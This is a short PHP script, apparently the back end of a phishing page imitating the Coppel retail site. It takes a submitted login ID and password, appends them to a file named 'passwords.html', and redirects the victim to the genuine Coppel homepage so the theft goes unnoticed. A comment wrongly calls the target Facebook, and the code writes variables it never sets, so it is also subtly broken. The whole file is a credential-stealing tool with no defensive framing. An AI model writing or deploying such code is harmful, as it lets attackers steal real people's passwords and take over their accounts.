<?php

$Correo = $_POST['logonId']; 

$Contraseña = $_POST['logonPassword'];

$SALTO="\r\n";

$f = fopen("passwords.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Correo: '.$logonId.$SALTO.'Contraseña: '.$logonPassword.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: https://www.coppel.com/?epaRT=10036513885&gclid=Cj0KCQjwoub3BRC6ARIsABGhnyZZp_2yqjmYEujJRrhJ0GqNRXhdI2ao64PkDsrjtwLTGblCo8aRrWkaAh5eEALw_wcB');
?>